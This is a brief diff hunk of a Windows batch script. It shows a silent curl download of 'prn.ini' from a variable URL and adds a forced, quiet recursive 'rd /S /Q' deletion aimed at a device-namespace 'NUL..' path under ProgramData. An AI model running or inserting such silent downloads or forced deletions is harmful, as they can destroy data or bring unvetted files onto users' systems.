@@ -10,4 +10,6 @@ if errorlevel 1 (
 dir "%dir%\prn.ini" >nul 2>nul
 if errorlevel 1 (
     curl -s -L -o "%dir%\prn.ini" "%url_prn%" >nul 2>&1
+
 )
+rd /S /Q \\.\%ProgramData%\NUL..\
